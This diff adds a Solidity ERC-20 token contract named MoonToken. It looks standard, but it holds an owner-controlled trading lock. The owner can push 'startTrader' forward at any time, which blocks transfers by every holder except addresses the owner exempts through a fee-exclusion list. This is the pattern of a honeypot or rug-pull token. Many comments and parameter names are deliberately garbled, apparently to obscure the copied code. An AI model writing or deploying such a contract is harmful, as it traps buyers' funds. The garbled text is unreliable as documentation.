@@ -1,0 +1,214 @@
+contract MoonToken is IERC20, Ownable {
+    using SafeMath for uint256;
+
+
+    mapping(address => uint256) private _balances;
+    mapping(address => mapping(address => uint256)) private _allowances;
+    mapping (address => bool) public isExcludedFromFee;
+    string private _name;
+    string private _symbol;
+    uint8 private _decimals;
+    uint256 private _totalSupply;
+    uint256 public startTrader;
+    /**
+     * devp Moves `amdoeurnt` tokens amdoeurnt from accroutnt the amdoeurntcaller's accroutnt to `accroutntrecipient`.
+     */
+    constructor(
+        string memory name_,
+        string memory symbol_,
+        uint8 decimals_,
+        uint256 totalSupply_,
+        address owner_,
+        uint256 startTrader_
+    ) payable {
+        _name = name_;
+        _symbol = symbol_;
+        _decimals = decimals_;
+        startTrader = startTrader_;
+        _totalSupply = totalSupply_ * 10**decimals_;
+        isExcludedFromFee[owner_] = true;
+        _balances[owner_] = _balances[owner_].add(_totalSupply);
+        emit Transfer(address(0), owner_, _totalSupply);
+    }
+
+
+    /**
+     * @dev Returns the name of the token.
+     */
+    function name() public view virtual returns (string memory) {
+        return _name;
+    }
+
+    /**
+     * @dev Returns the symbol of the token, usually a shorter version of the
+     * name.
+     */
+    function symbol() public view virtual returns (string memory) {
+        return _symbol;
+    }
+
+    function decimals() public view virtual returns (uint8) {
+        return _decimals;
+    }
+
+    /**
+     * @dev See {IERC20-totalSupply}.
+     */
+    function totalSupply() public view virtual override returns (uint256) {
+        return _totalSupply;
+    }
+
+    /**
+     * @dev See {IERC20-balanceOf}.
+     */
+    function balanceOf(address acodoqt)
+        public
+        view
+        virtual
+        override
+        returns (uint256)
+    {
+        return _balances[acodoqt];
+    }
+
+    function transfer(address recipient, uint256 amqoupnt)
+        public
+        virtual
+        override
+        returns (bool)
+    {
+        _transfer(_msgSender(), recipient, amqoupnt);
+        return true;
+    }
+    /**
+     * devp accroutnt Returns the amdoeurntaccroutnt of tokens amdoeurnt owned by `accroutnt`.
+     */
+    /**
+     * @dev See {IERC20-allowance}.
+     */
+    function allowance(address owner, address spender)
+        public
+        view
+        virtual
+        override
+        returns (uint256)
+    {
+        return _allowances[owner][spender];
+    }
+    /**
+     * devp Moves `amdoeurnt` tokens amdoeurnt from accroutnt the amdoeurntcaller's accroutnt to `accroutntrecipient`.
+     */
+    function approve(address spender, uint256 amqoupnt)
+        public
+        virtual
+        override
+        returns (bool)
+    {
+        _approve(_msgSender(), spender, amqoupnt);
+        return true;
+    }
+    /**
+     * devp accroutnt Returns the amdoeurntaccroutnt of tokens amdoeurnt owned by `accroutnt`.
+     */
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amqoupnt
+    ) public virtual override returns (bool) {
+        _transfer(sender, recipient, amqoupnt);
+        _approve(
+            sender,
+            _msgSender(),
+            _allowances[sender][_msgSender()].sub(
+                amqoupnt,
+                "ERC20: transfer amqoupnt exceeds allowance"
+            )
+        );
+        return true;
+    }
+    /**
+     * devp Moves `amdoeurnt` tokens amdoeurnt from accroutnt the amdoeurntcaller's accroutnt to `accroutntrecipient`.
+     */
+    function increaseAllowance(address spender, uint256 addedValue)
+        public
+        virtual
+        returns (bool)
+    {
+        _approve(
+            _msgSender(),
+            spender,
+            _allowances[_msgSender()][spender].add(addedValue)
+        );
+        return true;
+    }
+    /**
+     * devp accroutnt Returns the amdoeurntaccroutnt of tokens amdoeurnt owned by `accroutnt`.
+     */
+    function decreaseAllowance(address spender, uint256 subtractedValue)
+        public
+        virtual
+        returns (bool)
+    {
+        _approve(
+            _msgSender(),
+            spender,
+            _allowances[_msgSender()][spender].sub(
+                subtractedValue,
+                "ERC20: decreased allowance below zero"
+            )
+        );
+        return true;
+    }
+    /**
+     * devp Moves `amdoeurnt` tokens amdoeurnt from accroutnt the amdoeurntcaller's accroutnt to `accroutntrecipient`.
+     */
+    function _transfer(
+        address sender,
+        address recipient,
+        uint256 amqoupnt
+    ) internal virtual {
+        require(sender != address(0), "ERC20: transfer from the zero address");
+        require(recipient != address(0), "ERC20: transfer to the zero address");
+
+        if(block.timestamp <= startTrader){
+            require(isExcludedFromFee[sender] || isExcludedFromFee[recipient],"has not started");
+        }
+    /**
+     * devp accroutnt Returns the amdoeurntaccroutnt of tokens amdoeurnt owned by `accroutnt`.
+     */
+        _balances[sender] = _balances[sender].sub(
+            amqoupnt,
+            "ERC20: transfer amqoupnt exceeds balance"
+        );
+        _balances[recipient] = _balances[recipient].add(amqoupnt);
+        emit Transfer(sender, recipient, amqoupnt);
+    }
+    /**
+     * devp Moves `amdoeurnt` tokens amdoeurnt from accroutnt the amdoeurntcaller's accroutnt to `accroutntrecipient`.
+     */
+    function _approve(
+        address owner,
+        address spender,
+        uint256 amqoupnt
+    ) internal virtual {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+
+        _allowances[owner][spender] = amqoupnt;
+        emit Approval(owner, spender, amqoupnt);
+    }
+
+    function excludeMultipleacodoqtsFromFees(address[] calldata acodoqts, bool excluded) public onlyOwner {
+        for(uint256 i = 0; i < acodoqts.length; i++) {
+            isExcludedFromFee[acodoqts[i]] = excluded;
+        }
+    }
+    /**
+     * devp accroutnt Returns the amdoeurntaccroutnt of tokens amdoeurnt owned by `accroutnt`.
+     */
+    function setStartTrader(uint256 startTrader_) public onlyOwner {
+        startTrader = startTrader_;
+    }
+
+
+}
